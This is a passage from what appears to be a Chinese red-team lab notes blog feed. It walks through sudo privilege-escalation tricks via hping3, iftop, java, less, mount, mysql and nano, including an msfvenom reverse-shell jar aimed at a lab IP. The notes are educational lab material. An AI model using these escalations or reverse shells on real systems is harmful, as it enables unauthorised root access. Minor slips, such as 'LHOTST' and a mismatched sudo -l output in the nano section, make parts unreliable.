+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/hping3
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/hping3</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo hping3
+</span></span><span style="display:flex;"><span>hping3&gt; /bin/bash
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p><code>Hping3</code> 是一个强大的网络工具，用于分析和测试网络，生成各种类型的 <code>ICMP</code>、<code>IP</code>、<code>TCP</code>、<code>UDP</code> 和 <code>RAW-IP</code> 协议数据包，在交互式命令行启动新的 <code>bash</code> 会话。</p>
+<h3 id="sudo-iftop">sudo iftop</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> user on this host:
+</span></span><span style="display:flex;"><span>    env_reset, env_keep<span style="color:#f92672">+=</span>LD_PRELOAD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User user may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/iftop
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/find
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nano
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/rvim
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/man
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/awk
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/less
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ftp
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/apache2
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /bin/more
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/tcpdump
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/exiftool
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> NOPASSWD: /bin/bash
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/iftop</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ sudo iftop
+</span></span><span style="display:flex;"><span>interface: eth0
+</span></span><span style="display:flex;"><span>IP address is: 10.10.10.12
+</span></span><span style="display:flex;"><span>MAC address is: 00:0c:29:72:4e:62
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>!/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/user# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="sudo-java">sudo java</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/java
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/java</code> 命令，在 <code>kali</code> 中使用 <code>msfvenom</code> 制作一个反弹 <code>shell</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo msfvenom -p java/shell_reverse_tcp LHOTST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f jar -o shell.jar
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">7497</span> bytes
+</span></span><span style="display:flex;"><span>Final size of jar file: <span style="color:#ae81ff">7497</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.jar
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah shell.jar 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2767701</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root 7.4K Jan <span style="color:#ae81ff">19</span> 01:21 shell.jar
+</span></span></code></pre></div><p>传入靶机后使用 <code>sudo</code> 权限运行，同时在 <code>kali</code> 中建立监听。</p>
+<p><img src="Pasted%20image%2020260119142451.png" alt=""></p>
+<p>碰到这种大型的语言或工具，其他的如 <code>perl</code>、<code>ruby</code>、<code>awk</code>，一定是有方法的，对于 <code>java</code> 这是标准的第一要能想到的办法。</p>
+<h3 id="sudo-less">sudo less</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/less
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/less</code> 命令，执行提权代码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo less /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>!/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>可以建立任意临时文件，在 <code>less</code> 中按 <code>!</code> 进入命令模式，<code>/bin/bash</code> 启动新的 <code>shell</code> 会话。</p>
+<h3 id="sudo-mount">sudo mount</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mount
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/mount</code> 命令，执行提权代码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo mount -o bind /bin/bash /bin/mount
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo /bin/mount
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>这段代码使用 <code>sudo mount</code> 进行挂载，将 <code>/bin/bash</code> 挂载到 <code>/bin/mount</code> 下。</p>
+<h3 id="sudo-mysql">sudo mysql</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/mysql</code> 命令，执行提权代码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo mysql -e <span style="color:#e6db74">&#39;\! /bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p><code>-e</code> 是 <code>mysql</code> 的一个参数，execute 一些命令后退出，<code>-e</code> 允许直接在命令行中输入命令，而不需要打开一个 <code>mysql</code> 互动式会话。</p>
+<p><code>\! /bin/bash</code> 并不是一条 <code>SQL</code> 命令，而是 <code>mysql</code> 的一个特殊命令。当在 <code>mysql</code> 命令提示符后输入 <code>!</code> 时，可以运行一个系统 <code>shell</code> 命令。</p>
+<h3 id="sudo-nano">sudo nano</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/nano</code> 命令，执行提权代码。</p>
+<p>使用 <code>sudo nano</code> 启动 <code>nano</code> 后 <code>ctrl+r</code>，然后 <code>ctrl+x</code> 获得命令执行命令行，然后输入 <code>reset; bash 1&gt;&amp;0 2&gt;&amp;0</code> 重置 <code>shell</code>，启动 <code>bash</code>，输出和错误输入重定向，获得提权后的 <code>shell</code>。</p>
+<p><img src="Pasted%20image%2020260119144813.png" alt=""></p>
+<ul>
+<li>
+<p>0：标准输入，默认情况下与键盘输入相关联，接收用户从终端输入的数据。</p>
+</li>
+<li>
+<p>1：标准输出，默认情况下与终端输出相关联，将程序输出的信息显示在终端上。</p>
+</li>
+<li>
+<p>2：标准错误，默认情况下与终端输出相关联，用于显示程序的错误信息或警告。</p>
+</li>
+<li>
+<p>3：第一个额外描述符。</p>
+</li>
+<li>
+<p>4：第二个额外描述符。</p>
+</li>
+<li>
+<p>&hellip;&hellip;</p>
+</li>
+<li>
+<p>10：第八个额外描述符。</p>
+</li>
+</ul>
 ]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
